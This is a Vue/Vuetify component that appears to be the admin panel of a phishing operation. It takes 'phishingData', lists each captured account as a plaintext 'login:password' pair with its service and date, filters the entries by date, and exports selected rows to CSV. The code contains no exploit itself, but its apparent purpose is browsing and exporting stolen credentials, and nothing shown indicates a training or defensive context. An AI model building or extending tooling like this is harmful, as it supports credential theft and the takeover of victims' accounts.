<template>
  <div>
      <v-row align="center" class="mb-2">
        <v-col cols="12" sm="4">
          <v-menu v-model="menu" :close-on-content-click="false" :nudge-right="40" transition="scale-transition" offset-y min-width="290px">
            <template #activator="{ on, attrs }">
              <v-text-field v-model="dateRange.start" label="Start date" prepend-icon="mdi-calendar" readonly v-bind="attrs" v-on="on"></v-text-field>
            </template>
            <v-date-picker v-model="dateRange.start" @input="menu = false"></v-date-picker>
          </v-menu>
        </v-col>

        <v-col cols="12" sm="4">
          <v-menu v-model="menu2" :close-on-content-click="false" :nudge-right="40" transition="scale-transition" offset-y min-width="290px">
            <template #activator="{ on, attrs }">
              <v-text-field v-model="dateRange.end" label="End date" prepend-icon="mdi-calendar" readonly v-bind="attrs" v-on="on"></v-text-field>
            </template>
            <v-date-picker v-model="dateRange.end" @input="menu2 = false"></v-date-picker>
          </v-menu>
        </v-col>

        <v-col cols="12" sm="4">
          <v-btn color="primary" class="mr-2" @click="setToday">Today</v-btn>
          <v-btn color="primary" class="ml-2 mr-2" @click="$emit('refresh')">Refresh</v-btn>
          <v-btn color="primary" class="ml-2" @click="exportToCSV">Export</v-btn>
        </v-col>
      </v-row>

    <v-data-table
        :headers="headers"
        :items="filteredData"
        :items-per-page="5"
        class="elevation-1"
        show-select
        item-key="id"
        v-model="selected"
    >
      <template v-slot:[`item.account`]="{ item }">
        <div class="d-flex align-center justify-center">
    <span class="custom-text-field mb-2 ma-2">
      {{ `${item.account.login}:${item.account.password}` }}
    </span>
        </div>
      </template>






    </v-data-table>
  </div>
</template>


<script>
import Papa from 'papaparse';

export default {
  props: {
    phishingData: {
      type: Array,
      required: true,
    },
  },
  data: () => ({
    headers: [
      { text: 'ID', value: 'id' },
      { text: 'Date', value: 'date' },
      { text: 'Account', value: 'account' },
      { text: 'Service', value: 'service' },
    ],
    dateRange: {
      start: null,
      end: null,
    },
    menu: false,
    menu2: false,
    selected: [],
  }),
  methods: {
    setToday() {
      let today = new Date().toISOString().substr(0, 10); // convert to 'YYYY-MM-DD' format
      this.dateRange.start = today;
      this.dateRange.end = today;
    },
    getUniqueServices() {
      const services = new Set();
      this.phishingData.forEach(item => services.add(item.service));
      return Array.from(services);
    },
    exportToCSV() {
      const selectedData = this.selected;

      if (selectedData.length === 0) {
        alert('No data selected for export.');
        return;
      }

      const csvData = Papa.unparse(selectedData);
      const csvBlob = new Blob([csvData], { type: 'text/csv;charset=utf-8;' });
      const csvUrl = window.URL.createObjectURL(csvBlob);

      const downloadLink = document.createElement('a');
      downloadLink.href = csvUrl;
      downloadLink.setAttribute('download', 'exported_data.csv');
      document.body.appendChild(downloadLink);
      downloadLink.click();
      document.body.removeChild(downloadLink);
    },
  },
  computed: {
    filteredData() {
      if (!this.dateRange.start || !this.dateRange.end) {
        return this.phishingData;
      }
      let startDate = new Date(this.dateRange.start);
      let endDate = new Date(this.dateRange.end);
      return this.phishingData.filter(item => {
        let itemDate = new Date(item.date);
        return itemDate >= startDate && itemDate <= endDate;
      });
    },
  },
};
</script>
